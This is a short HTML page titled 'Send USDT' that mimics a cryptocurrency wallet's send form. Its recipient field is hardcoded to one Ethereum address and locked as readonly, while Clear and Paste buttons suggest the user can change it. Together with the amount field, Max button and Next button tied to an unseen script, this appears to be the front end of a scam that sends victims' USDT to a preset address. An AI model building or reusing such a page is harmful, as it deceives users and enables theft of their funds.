<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Send USDT</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <div class="container">
    <form>
      <label for="address">Address or Domain Name</label>
      <div class="input-wrapper">
        <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly>
        <button type="button" id="clearBtn">&#10005;</button>
        <button type="button" id="pasteBtn">Paste</button>
      </div>

      <label for="amount">Amount</label>
      <div class="input-wrapper">
        <input type="number" id="amount" placeholder="USDT Amount">
        <span class="suffix">USDT</span>
        <button type="button" id="maxBtn">Max</button>
      </div>
      <p id="usdValue">&asymp; $0.00</p>

      <button type="button" id="sendBtn">Next</button>
    </form>
  </div>

  <script src="script.js"></script>
</body>

</html>
